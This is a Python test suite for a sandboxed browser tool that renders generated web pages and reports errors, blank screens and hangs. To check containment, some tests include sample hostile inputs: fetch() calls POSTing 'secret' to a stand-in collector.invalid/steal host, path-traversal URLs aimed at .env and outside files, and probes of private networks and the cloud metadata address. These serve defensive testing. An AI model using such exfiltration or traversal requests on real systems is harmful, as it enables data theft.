import base64
import hashlib
import json
import os
from pathlib import Path
import socket
import struct
import sys
import tempfile
import threading
import types
import unittest
import urllib.error
import urllib.request
import zlib
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "cmd/forge/compiler/lib"))
import browser_tools as bt

BROWSER = bt.find_chromium()


# ---------------------------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------------------------

def make_png(rows, width, filters=None):
    """An 8-bit RGB PNG from rows of (r, g, b) tuples, applying the forward PNG filter per row so
    the decoder's unfiltering is exercised (filters: 0 none, 1 sub, 2 up, 3 average, 4 paeth)."""
    channels = 3
    previous = bytearray(width * channels)
    data = bytearray()
    for index, row in enumerate(rows):
        line = bytearray(value for pixel in row for value in pixel)
        kind = (filters or [0])[index % len(filters or [0])]
        out = bytearray(len(line))
        for i, value in enumerate(line):
            a = line[i - channels] if i >= channels else 0
            b = previous[i]
            c = previous[i - channels] if i >= channels else 0
            if kind == 0:
                predictor = 0
            elif kind == 1:
                predictor = a
            elif kind == 2:
                predictor = b
            elif kind == 3:
                predictor = (a + b) >> 1
            else:
                p = a + b - c
                pa, pb, pc = abs(p - a), abs(p - b), abs(p - c)
                predictor = a if pa <= pb and pa <= pc else (b if pb <= pc else c)
            out[i] = (value - predictor) & 255
        data.append(kind)
        data += out
        previous = line

    def chunk(kind, body):
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body) & 0xFFFFFFFF)

    header = struct.pack(">IIBBBBB", width, len(rows), 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", zlib.compress(bytes(data))) + chunk(b"IEND", b"")


class FakeBrowserServer:
    """A one-connection WebSocket server that sends a scripted burst of frames."""

    def __init__(self, burst):
        self.burst = burst
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(1)
        self.port = self.listener.getsockname()[1]
        self.received = []
        self.thread = threading.Thread(target=self.serve, daemon=True)
        self.thread.start()

    @staticmethod
    def frame(opcode, payload, final=True):
        head = bytes([(0x80 if final else 0) | opcode])
        if len(payload) < 126:
            return head + bytes([len(payload)]) + payload
        if len(payload) < 65536:
            return head + bytes([126]) + struct.pack(">H", len(payload)) + payload
        return head + bytes([127]) + struct.pack(">Q", len(payload)) + payload

    def serve(self):
        connection, _ = self.listener.accept()
        request = b""
        while b"\r\n\r\n" not in request:
            request += connection.recv(4096)
        key = next(line.split(b":", 1)[1].strip() for line in request.split(b"\r\n") if line.lower().startswith(b"sec-websocket-key"))
        accept = base64.b64encode(hashlib.sha1(key + bt._GUID.encode()).digest())
        connection.sendall(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept + b"\r\n\r\n")
        for item in self.burst:
            connection.sendall(item)
        # read masked client frames; remember the text one (a pong answers the ping first)
        while True:
            header = connection.recv(2)
            if len(header) < 2:
                break
            opcode, length = header[0] & 0x0F, header[1] & 0x7F
            mask = connection.recv(4)
            body = b""
            while len(body) < length:
                body += connection.recv(length - len(body))
            text = bytes(byte ^ mask[i % 4] for i, byte in enumerate(body))
            if opcode == 0x1:
                self.received.append(text.decode())
                break
            self.pongs = getattr(self, "pongs", []) + [text]
        connection.close()
        self.listener.close()


# ---------------------------------------------------------------------------------------------
# containment
# ---------------------------------------------------------------------------------------------

class Containment(unittest.TestCase):
    ORIGIN = 5555

    def check(self, url, method="GET"):
        return bt.request_allowed(url, method, self.ORIGIN)

    def test_the_local_origin_is_allowed_for_any_method(self):
        for method in ("GET", "POST", "PUT"):
            self.assertTrue(self.check("http://127.0.0.1:5555/index.html", method)[0], method)
        self.assertTrue(self.check("http://localhost:5555/a.js")[0])
        self.assertTrue(self.check("ws://127.0.0.1:5555/socket")[0])

    def test_other_local_services_and_private_networks_are_refused(self):
        for url in (
            "http://127.0.0.1:9999/", "http://localhost:8188/prompt", "http://[::1]:9999/",
            "http://192.168.1.10/", "http://10.0.0.5/admin", "http://172.16.0.1/", "http://169.254.169.254/latest/meta-data/",
        ):
            allowed, reason = self.check(url)
            self.assertFalse(allowed, url)
            self.assertTrue(reason, url)

    def test_public_hosts_may_be_read_but_nothing_may_be_sent(self):
        self.assertTrue(self.check("https://93.184.216.34/lib.js")[0])
        for method in ("GET", "HEAD", "OPTIONS"):
            self.assertTrue(self.check("https://93.184.216.34/x", method)[0], method)
        for method in ("POST", "PUT", "DELETE", "PATCH"):
            allowed, reason = self.check("https://93.184.216.34/collect", method)
            self.assertFalse(allowed, method)
            self.assertIn("send data out", reason)
        self.assertFalse(self.check("wss://93.184.216.34/live")[0])

    def test_non_network_schemes(self):
        self.assertTrue(self.check("data:text/plain;base64,AAAA")[0])
        self.assertTrue(self.check("blob:http://127.0.0.1:5555/uuid")[0])
        for url in ("file:///C:/Windows/win.ini", "ftp://93.184.216.34/x", "chrome://settings", "javascript:alert(1)"):
            self.assertFalse(self.check(url)[0], url)


# ---------------------------------------------------------------------------------------------
# WebSocket client
# ---------------------------------------------------------------------------------------------

class WebSocketClient(unittest.TestCase):
    def test_messages_fragments_and_pings(self):
        big = ("x" * 70000)
        server = FakeBrowserServer([
            FakeBrowserServer.frame(0x1, b"hello"),
            FakeBrowserServer.frame(0x9, b"ping!"),                               # answered with a pong, not returned
            FakeBrowserServer.frame(0x1, b"frag", final=False),
            FakeBrowserServer.frame(0x0, b"mented", final=True),
            FakeBrowserServer.frame(0x1, big.encode()),                           # 64-bit length form
        ])
        socket_client = bt.WebSocket("127.0.0.1", server.port, "/devtools/browser/x", timeout=5)
        try:
            self.assertEqual(socket_client.recv(3), "hello")
            self.assertEqual(socket_client.recv(3), "fragmented")
            self.assertEqual(socket_client.recv(3), big)
            socket_client.send_text('{"id":1}')
            server.thread.join(3)
            self.assertEqual(server.received, ['{"id":1}'])
            self.assertEqual(server.pongs, [b"ping!"])
        finally:
            socket_client.close()

    def test_a_quiet_connection_times_out_instead_of_blocking(self):
        server = FakeBrowserServer([])
        socket_client = bt.WebSocket("127.0.0.1", server.port, "/", timeout=5)
        try:
            self.assertIsNone(socket_client.recv(0.2))
        finally:
            socket_client.close()

    def test_a_server_that_does_not_upgrade_is_an_error(self):
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)

        def refuse():
            connection, _ = listener.accept()
            connection.recv(4096)
            connection.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            connection.close()

        threading.Thread(target=refuse, daemon=True).start()
        with self.assertRaises(bt.WebSocketError):
            bt.WebSocket("127.0.0.1", listener.getsockname()[1], "/", timeout=5)
        listener.close()


# ---------------------------------------------------------------------------------------------
# screenshot statistics
# ---------------------------------------------------------------------------------------------

class ScreenshotStatistics(unittest.TestCase):
    def test_a_single_colour_image_is_blank(self):
        stats = bt.png_stats(make_png([[(12, 12, 12)] * 40 for _ in range(30)], 40))
        self.assertEqual((stats["width"], stats["height"]), (40, 30))
        self.assertEqual(stats["dominant"], 1.0)
        self.assertTrue(bt.blank_verdict(stats).startswith("BLANK"))

    def test_an_image_with_content_is_not(self):
        rows = [[((x * 7) % 256, (y * 11) % 256, ((x + y) * 5) % 256) for x in range(60)] for y in range(40)]
        stats = bt.png_stats(make_png(rows, 60))
        self.assertLess(stats["dominant"], 0.5)
        self.assertGreater(stats["distinct"], 10)
        self.assertTrue(bt.blank_verdict(stats).startswith("has content"))

    def test_every_png_filter_type_decodes_to_the_same_picture(self):
        rows = [[((x * 13 + y * 3) % 256, (x * 5) % 256, (y * 17) % 256) for x in range(24)] for y in range(25)]
        reference = bt.png_stats(make_png(rows, 24, filters=[0]))
        for kind in (1, 2, 3, 4):
            self.assertEqual(bt.png_stats(make_png(rows, 24, filters=[kind])), reference, f"filter {kind}")
        self.assertEqual(bt.png_stats(make_png(rows, 24, filters=[0, 1, 2, 3, 4])), reference)

    def test_a_mostly_empty_page_is_called_out_and_junk_is_not_assessed(self):
        rows = [[(0, 0, 0)] * 100 for _ in range(100)]
        for y in range(3):
            rows[y] = [(255, 255, 255)] * 100
        self.assertTrue(bt.blank_verdict(bt.png_stats(make_png(rows, 100))).startswith("mostly empty"))
        self.assertIsNone(bt.png_stats(b"not a png"))
        self.assertEqual(bt.blank_verdict(None), "not assessed")


# ---------------------------------------------------------------------------------------------
# the site server
# ---------------------------------------------------------------------------------------------

class SiteServer(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        root = Path(self.temp.name) / "src"
        (root / "assets").mkdir(parents=True)
        (root / "index.html").write_text("<h1>home</h1>", encoding="utf-8")
        (root / "assets" / "model.glb").write_bytes(b"glTF....")
        (root / ".env").write_text("SECRET=1", encoding="utf-8")
        (Path(self.temp.name) / "outside.txt").write_text("outside", encoding="utf-8")
        self.site = bt._Site(root)
        self.addCleanup(self.site.close)
        self.addCleanup(self.temp.cleanup)

    def get(self, path, host=None):
        request = urllib.request.Request(f"http://127.0.0.1:{self.site.port}{path}")
        if host:
            request.add_header("Host", host)
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                return response.status, response.headers.get("Content-Type"), response.read()
        except urllib.error.HTTPError as error:
            error.close()
            return error.code, None, b""

    def test_it_serves_files_with_their_types(self):
        status, kind, body = self.get("/")
        self.assertEqual((status, body), (200, b"<h1>home</h1>"))
        self.assertTrue(kind.startswith("text/html"))
        self.assertEqual(self.get("/assets/model.glb")[1], "model/gltf-binary")

    def test_traversal_dotfiles_and_foreign_hosts_are_refused(self):
        for path in ("/.env", "/%2e%2e/outside.txt", "/assets/..%2f..%2foutside.txt", "/assets/../../outside.txt", "/nope.html"):
            self.assertEqual(self.get(path)[0], 404, path)
        self.assertEqual(self.get("/", host="evil.example:80")[0], 404)

    def test_the_url_builder_quotes_path_segments(self):
        self.assertEqual(self.site.url("a b/c#d.html"), f"http://127.0.0.1:{self.site.port}/a%20b/c%23d.html")


# ---------------------------------------------------------------------------------------------
# report and backend selection (no browser needed)
# ---------------------------------------------------------------------------------------------

class Report(unittest.TestCase):
    def observation(self, **changes):
        obs = bt._new_observation()
        obs.update({"loaded": True, "load_ms": 420, "requests": 9, "wait_seconds": 3.0, "frames_during_wait": 180,
                    "page": {"title": "Gallery", "canvases": [{"width": 800, "height": 600, "context": "webgl2", "lost": False}], "text": "Welcome"},
                    "stats": {"width": 256, "height": 144, "dominant": 0.4, "distinct": 90}})
        obs.update(changes)
        return obs

    def test_a_healthy_page_says_so(self):
        text = bt.format_report("index.html", self.observation(), "run_page/index-1.png", "system browser")
        self.assertIn("Result: NO PROBLEMS FOUND.", text)
        self.assertIn("Screenshot: run_page/index-1.png", text)
        self.assertIn("180 animation frames", text)
        self.assertIn("800x600 webgl2", text)

    def test_problems_are_listed_and_counted(self):
        obs = self.observation(
            exceptions=["ReferenceError: THREE is not defined (scene.js:15)"],
            failed=["net::ERR_BLOCKED_BY_ORB https://cdn.example/three.min.js"],
            http_errors=["404 http://127.0.0.1:1/assets/a.jpg"],
            console=[("error", "texture failed"), ("warning", "deprecated"), ("log", "hello")],
            frames_during_wait=0,
            stats={"width": 256, "height": 144, "dominant": 1.0, "distinct": 1},
        )
        text = bt.format_report("index.html", obs, "", "system browser")
        for expected in ("UNCAUGHT EXCEPTIONS (1)", "THREE is not defined", "FAILED REQUESTS (1)", "HTTP errors (1)",
                         "Console errors (1)", "Console warnings (1)", "NO requestAnimationFrame", "BLANK", "screen is blank"):
            self.assertIn(expected, text)
        self.assertNotIn("hello", text)           # plain log lines are not problems
        self.assertIn("4 problem(s)", text)

    def test_a_page_that_never_finished_loading_is_a_problem(self):
        text = bt.format_report("index.html", self.observation(loaded=False, load_ms=None), "", "system browser")
        self.assertIn("LOAD INCOMPLETE", text)
        self.assertNotIn("NO PROBLEMS FOUND", text)

    def test_long_lists_and_reports_are_bounded(self):
        obs = self.observation(console=[("error", f"failure number {i}") for i in range(200)], exceptions=["x" * 5000])
        text = bt.format_report("index.html", obs, "", "system browser")
        self.assertLessEqual(len(text), bt.REPORT_LIMIT)
        self.assertIn("and 188 more", text)


class Backends(unittest.TestCase):
    def test_playwright_is_preferred_whenever_it_is_importable(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("RETICLE_BROWSER_BACKEND", None)
            with patch.object(bt, "_playwright_available", return_value=True):
                self.assertEqual(bt.choose_backend("C:/chrome.exe"), "playwright")
                self.assertEqual(bt.choose_backend(None), "playwright")

    def test_the_devtools_client_is_the_zero_install_fallback(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("RETICLE_BROWSER_BACKEND", None)
            with patch.object(bt, "_playwright_available", return_value=False):
                self.assertEqual(bt.choose_backend("C:/chrome.exe"), "cdp")
                self.assertIsNone(bt.choose_backend(None))

    def _workspace(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        (Path(temp.name) / "src").mkdir()
        (Path(temp.name) / "src" / "index.html").write_text("<p>x</p>", encoding="utf-8")
        return temp.name

    def test_an_automatically_chosen_playwright_that_cannot_start_falls_back_to_the_system_browser(self):
        used = []
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("RETICLE_BROWSER_BACKEND", None)
            with patch.object(bt, "find_chromium", return_value="C:/chrome.exe"), \
                    patch.object(bt, "_playwright_available", return_value=True), \
                    patch.object(bt, "_playwright_session", side_effect=RuntimeError("Executable doesn't exist; run playwright install")), \
                    patch.object(bt, "_cdp_session", side_effect=lambda *a: used.append("cdp") or b""):
                report = bt.run_page(self._workspace(), wait_ms=0, screenshot=False)
        self.assertEqual(used, ["cdp"])
        self.assertIn("Playwright was unavailable", report)
        self.assertIn("Executable doesn't exist", report)

    def test_a_forced_playwright_that_cannot_start_is_an_error_not_a_silent_switch(self):
        with patch.dict(os.environ, {"RETICLE_BROWSER_BACKEND": "playwright"}):
            with patch.object(bt, "find_chromium", return_value="C:/chrome.exe"), \
                    patch.object(bt, "_playwright_available", return_value=True), \
                    patch.object(bt, "_playwright_session", side_effect=RuntimeError("driver crashed")), \
                    patch.object(bt, "_cdp_session", side_effect=AssertionError("must not fall back")):
                report = bt.run_page(self._workspace(), wait_ms=0, screenshot=False)
        self.assertTrue(report.startswith("Error: the browser could not run the page (playwright)"))
        self.assertIn("driver crashed", report)

    def test_the_backend_can_be_forced(self):
        with patch.object(bt, "_playwright_available", return_value=True):
            with patch.dict(os.environ, {"RETICLE_BROWSER_BACKEND": "playwright"}):
                self.assertEqual(bt.choose_backend("C:/chrome.exe"), "playwright")
        with patch.dict(os.environ, {"RETICLE_BROWSER_BACKEND": "cdp"}):
            self.assertIsNone(bt.choose_backend(None))

    def test_an_explicit_browser_path_must_exist(self):
        with tempfile.TemporaryDirectory() as folder:
            real = Path(folder) / "chrome.exe"
            real.write_text("", encoding="utf-8")
            with patch.dict(os.environ, {"RETICLE_BROWSER": str(real)}):
                self.assertEqual(bt.find_chromium(), str(real))
            with patch.dict(os.environ, {"RETICLE_BROWSER": str(Path(folder) / "missing.exe")}):
                self.assertIsNone(bt.find_chromium())

    def test_no_browser_at_all_is_a_clear_error_not_a_crash(self):
        with tempfile.TemporaryDirectory() as workspace:
            (Path(workspace) / "src").mkdir()
            (Path(workspace) / "src" / "index.html").write_text("<p>x</p>", encoding="utf-8")
            with patch.object(bt, "find_chromium", return_value=None), patch.object(bt, "_playwright_available", return_value=False):
                result = bt.run_page(workspace)
        self.assertTrue(result.startswith("Error: "))
        self.assertIn("RETICLE_BROWSER", result)

    def test_missing_page_and_bad_arguments(self):
        with tempfile.TemporaryDirectory() as workspace:
            (Path(workspace) / "src").mkdir()
            self.assertIn("no .html page", bt.run_page(workspace))
            (Path(workspace) / "src" / "index.html").write_text("<p>x</p>", encoding="utf-8")
            self.assertIn("does not exist", bt.run_page(workspace, path="other.html"))
            self.assertIn("list of objects", bt.run_page(workspace, actions="click"))
            self.assertIn("at most", bt.run_page(workspace, actions=[{"wait_ms": 1}] * (bt.MAX_ACTIONS + 1)))


class PlaywrightBackend(unittest.TestCase):
    """The optional backend, against a stand-in for the package."""

    def install_fake(self, screenshot=b""):
        handlers = {}
        record = {"routes": [], "closed": False}

        class Page:
            def on(self, name, handler):
                handlers[name] = handler

            def goto(self, url, wait_until=None, timeout=None):
                record["url"] = url
                handlers["dialog"](types.SimpleNamespace(type="alert", message="welcome", accept=lambda: None))
                handlers["console"](types.SimpleNamespace(type="error", text="texture failed", location={"url": "http://x/main.js", "lineNumber": 4}))
                handlers["pageerror"](Exception("ReferenceError: THREE is not defined"))
                handlers["response"](types.SimpleNamespace(status=404, url="http://x/a.png"))

            def wait_for_timeout(self, ms):
                pass

            def evaluate(self, expression):
                if "__reticleFrames ||" in expression and "JSON" not in expression:
                    return 30
                return json.dumps({"title": "Fake", "canvases": [], "text": "hi"})

            def screenshot(self, type="png"):
                return screenshot

        class Context:
            def route(self, pattern, handler):
                record["routes"].append(handler)

            def add_init_script(self, script):
                pass

            def new_page(self):
                return Page()

        class Browser:
            def new_context(self, **kwargs):
                return Context()

            def close(self):
                record["closed"] = True

        class Driver:
            class chromium:
                @staticmethod
                def launch(**kwargs):
                    record["launch"] = kwargs
                    return Browser()

        class Manager:
            def __enter__(self):
                return Driver()

            def __exit__(self, *args):
                return False

        package = types.ModuleType("playwright")
        sync_api = types.ModuleType("playwright.sync_api")
        sync_api.sync_playwright = lambda: Manager()
        package.sync_api = sync_api
        return {"playwright": package, "playwright.sync_api": sync_api}, record

    def test_it_collects_the_same_things_through_the_same_report(self):
        modules, record = self.install_fake(screenshot=make_png([[(9, 9, 9)] * 20 for _ in range(10)], 20))
        with tempfile.TemporaryDirectory() as workspace:
            (Path(workspace) / "src").mkdir()
            (Path(workspace) / "src" / "index.html").write_text("<p>x</p>", encoding="utf-8")
            with patch.dict(sys.modules, modules), patch.object(bt, "find_chromium", return_value=None), \
                    patch.object(bt, "_playwright_available", return_value=True):
                report = bt.run_page(workspace, wait_ms=100)
            self.assertTrue((Path(workspace) / "src" / "run_page" / "index-1.png").is_file())
        self.assertIn("(playwright)", report)
        self.assertIn("THREE is not defined", report)
        self.assertIn("404 http://x/a.png", report)
        self.assertIn("texture failed", report)
        self.assertIn("alert: welcome", report)
        self.assertIn("BLANK", report)
        self.assertTrue(record["closed"], "the browser must always be closed")
        self.assertTrue(record["url"].startswith("http://127.0.0.1:"))

    def test_the_route_guard_applies_the_same_containment(self):
        modules, record = self.install_fake()
        with tempfile.TemporaryDirectory() as workspace:
            (Path(workspace) / "src").mkdir()
            (Path(workspace) / "src" / "index.html").write_text("<p>x</p>", encoding="utf-8")
            with patch.dict(sys.modules, modules), patch.object(bt, "find_chromium", return_value=None), \
                    patch.object(bt, "_playwright_available", return_value=True):
                bt.run_page(workspace, wait_ms=0, screenshot=False)
        self.assertEqual(len(record["routes"]), 1)
        outcomes = []

        def request(url, method):
            route = types.SimpleNamespace(
                request=types.SimpleNamespace(url=url, method=method),
                continue_=lambda: outcomes.append("continue"), abort=lambda: outcomes.append("abort"),
            )
            return route

        guard = record["routes"][0]
        guard(request("https://93.184.216.34/lib.js", "GET"))
        guard(request("https://93.184.216.34/collect", "POST"))
        guard(request("http://192.168.0.1/", "GET"))
        self.assertEqual(outcomes, ["continue", "abort", "abort"])


# ---------------------------------------------------------------------------------------------
# a real browser
# ---------------------------------------------------------------------------------------------

@unittest.skipUnless(BROWSER, "no Chrome or Edge installed")
class RealBrowser(unittest.TestCase):
    def workspace(self, files):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        for name, content in files.items():
            target = Path(temp.name) / "src" / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")
        return temp.name

    def run_page(self, files, **options):
        options.setdefault("wait_ms", 700)
        options.setdefault("deadline_seconds", 40)
        launched = []
        real_launch = bt._launch

        def recording_launch(*args):
            process = real_launch(*args)
            launched.append(process)
            return process

        workspace = self.workspace(files)
        profiles_before = set(Path(tempfile.gettempdir()).glob("reticle-run-page-*"))
        # These tests are about the built-in DevTools client, so it is forced even when Playwright
        # is importable (and would otherwise be preferred).
        with patch.object(bt, "_launch", recording_launch), patch.dict(os.environ, {"RETICLE_BROWSER_BACKEND": "cdp"}):
            report = bt.run_page(workspace, **options)
        # whatever happened, nothing is left running and the throwaway profile is gone
        self.assertTrue(launched, report)
        for process in launched:
            self.assertIsNotNone(process.poll(), "the browser was left running")
        self.assertEqual(set(Path(tempfile.gettempdir()).glob("reticle-run-page-*")) - profiles_before, set())
        return report, workspace

    def test_a_working_animated_page_is_clean(self):
        page = """<!doctype html><title>Alive</title><body style="margin:0"><h1>Gallery</h1>
        <canvas id=c width=200 height=100 style="position:fixed;inset:0;width:100vw;height:100vh"></canvas>
        <script>const g=document.getElementById('c').getContext('2d');let t=0;
        (function draw(){g.fillStyle='hsl('+(t++%360)+',80%,50%)';g.fillRect(0,0,100,100);
        g.fillStyle='#223';g.fillRect(100,0,100,100);g.fillStyle='#fc3';g.beginPath();g.arc(150,50,30,0,6.3);g.fill();
        requestAnimationFrame(draw)})();</script>"""
        report, workspace = self.run_page({"index.html": page})
        self.assertIn("Result: NO PROBLEMS FOUND.", report)
        self.assertIn("Title: Alive", report)
        self.assertIn("200x100 2d", report)
        self.assertNotIn("BLANK", report)
        shot = Path(workspace) / "src" / "run_page" / "index-1.png"
        self.assertTrue(shot.read_bytes().startswith(b"\x89PNG"))
        self.assertIn("Screenshot: run_page/index-1.png", report)

    def test_exceptions_missing_files_and_console_errors_are_all_reported(self):
        page = """<!doctype html><title>Broken</title><body><p>hi</p>
        <script src="missing.js"></script><img src="nope.png">
        <script>console.error('texture failed to decode');setTimeout(()=>{throw new Error('kaboom in render loop')},50)</script>"""
        report, _ = self.run_page({"index.html": page})
        self.assertIn("UNCAUGHT EXCEPTIONS", report)
        self.assertIn("kaboom in render loop", report)
        self.assertIn("texture failed to decode", report)
        self.assertIn("missing.js", report)
        self.assertIn("nope.png", report)
        self.assertNotIn("favicon", report)
        self.assertNotIn("NO PROBLEMS FOUND", report)

    def test_a_blank_page_is_called_blank(self):
        report, _ = self.run_page({"index.html": "<!doctype html><title>Empty</title><body style='background:#101010'></body>"})
        self.assertIn("BLANK", report)
        self.assertIn("screen is blank", report)

    def test_a_canvas_nothing_draws_to_is_not_mistaken_for_a_renderer(self):
        report, _ = self.run_page({"index.html": "<!doctype html><body><canvas id=stage></canvas></body>"})
        self.assertIn("no context was ever requested", report)

    def test_webgl_works_without_a_gpu(self):
        page = """<!doctype html><body><canvas id=c width=160 height=90></canvas><script>
        const gl=document.getElementById('c').getContext('webgl2')||document.getElementById('c').getContext('webgl');
        gl.clearColor(0.9,0.2,0.1,1);gl.clear(gl.COLOR_BUFFER_BIT);
        (function f(){gl.clearColor(Math.random(),0.2,0.1,1);gl.clear(gl.COLOR_BUFFER_BIT);requestAnimationFrame(f)})();</script>"""
        report, _ = self.run_page({"index.html": page})
        self.assertRegex(report, r"160x90 webgl2?")
        self.assertNotIn("CONTEXT LOST", report)

    def test_the_page_cannot_send_data_out_or_reach_other_local_services(self):
        page = """<!doctype html><body><script>
        fetch('https://collector.invalid/steal',{method:'POST',body:'secret'}).catch(()=>{});
        fetch('http://127.0.0.1:1/').catch(()=>{});
        fetch('http://192.168.0.1/').catch(()=>{});</script>"""
        report, _ = self.run_page({"index.html": page})
        self.assertIn("Blocked by the sandbox", report)
        self.assertIn("POST https://collector.invalid/steal", report)
        self.assertIn("another local service", report)
        self.assertIn("private network", report)

    def test_actions_click_press_and_eval(self):
        page = """<!doctype html><body><button id=b onclick="document.title='clicked'">go</button>
        <script>window.keys=0;addEventListener('keydown',e=>{if(e.key==='ArrowRight')window.keys++})</script>"""
        report, _ = self.run_page({"index.html": page}, actions=[
            {"click": "#b"}, {"press": "ArrowRight", "hold_ms": 50}, {"press": "ArrowRight"},
            {"eval": "document.title"}, {"eval": "window.keys"}, {"click": "#missing"},
        ])
        self.assertIn("eval document.title -> \"clicked\"", report)
        self.assertIn("eval window.keys -> 2", report)
        self.assertIn("no element matches", report)

    def test_a_page_that_opens_dialogs_is_not_mistaken_for_a_hung_one(self):
        # alert() blocks the page until someone answers. It used to be reported as an endless loop
        # and held the node until the deadline.
        import time
        started = time.monotonic()
        page = """<!doctype html><title>Dialog</title><body><script>
        alert('welcome to the gallery');
        window.answer = confirm('enter?');
        document.title = 'after dialogs';</script>"""
        report, _ = self.run_page({"index.html": page}, actions=[{"eval": "document.title"}, {"eval": "window.answer"}], screenshot=False)
        self.assertLess(time.monotonic() - started, 20)
        self.assertNotIn("UNRESPONSIVE", report)
        self.assertIn("alert: welcome to the gallery", report)
        self.assertIn("confirm: enter?", report)
        self.assertIn('eval document.title -> "after dialogs"', report)
        self.assertIn("eval window.answer -> true", report)

    def test_a_hung_page_is_cut_off_at_the_deadline_and_the_browser_is_killed(self):
        import time
        started = time.monotonic()
        report, _ = self.run_page(
            {"index.html": "<!doctype html><body><script>setTimeout(()=>{while(true){}}, 200)</script>"},
            wait_ms=500, deadline_seconds=12, screenshot=False,
        )
        self.assertLess(time.monotonic() - started, 30)
        self.assertIn("PAGE UNRESPONSIVE", report)
        self.assertNotIn("NO PROBLEMS FOUND", report)


@unittest.skipUnless(BROWSER and bt._playwright_available(), "needs a system browser and the playwright package")
class RealPlaywright(unittest.TestCase):
    """The optional backend against the real package. The stand-in tests above cannot catch a
    mismatch with the library's actual behaviour (one hid the failure that explained a dead site)."""

    def report(self, page, **options):
        with tempfile.TemporaryDirectory() as workspace:
            target = Path(workspace) / "src"
            target.mkdir()
            (target / "index.html").write_text(page, encoding="utf-8")
            with patch.dict(os.environ, {"RETICLE_BROWSER_BACKEND": "playwright"}):
                return bt.run_page(workspace, wait_ms=500, deadline_seconds=40, screenshot=False, **options)

    def test_exceptions_requests_and_console_match_the_default_backend(self):
        report = self.report("""<!doctype html><title>B</title><body><script src="missing.js"></script>
        <script>console.error('texture failed');setTimeout(()=>{throw new ReferenceError('THREE is not defined')},30)</script>""")
        self.assertIn("(playwright)", report)
        self.assertIn("UNCAUGHT EXCEPTIONS", report)
        self.assertIn("ReferenceError: THREE is not defined", report)
        self.assertIn("texture failed", report)
        self.assertIn("missing.js", report)

    def test_a_failed_cdn_script_is_not_hidden(self):
        # This request fails the way a wrong CDN URL does; it is what made a whole site dead.
        report = self.report('<!doctype html><body><script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r158/three.min.js"></script>')
        self.assertTrue("FAILED REQUESTS" in report or "HTTP errors" in report, report)
        self.assertIn("three.min.js", report)

    def test_blocked_requests_are_listed_once_and_are_not_page_errors(self):
        report = self.report("""<!doctype html><body><script>
        fetch('https://collector.invalid/x',{method:'POST',body:'s'}).catch(()=>{});fetch('http://192.168.0.1/').catch(()=>{});</script>""")
        self.assertIn("Blocked by the sandbox", report)
        self.assertNotIn("FAILED REQUESTS", report)
        self.assertNotIn("Console errors", report)

    def test_dialogs_and_actions(self):
        report = self.report(
            """<!doctype html><body><button id=b onclick="document.title='clicked'">go</button><script>alert('hi')</script>""",
            actions=[{"click": "#b"}, {"eval": "document.title"}],
        )
        self.assertIn("alert: hi", report)
        self.assertIn('eval document.title -> "clicked"', report)
        self.assertNotIn("UNRESPONSIVE", report)


if __name__ == "__main__":
    unittest.main()
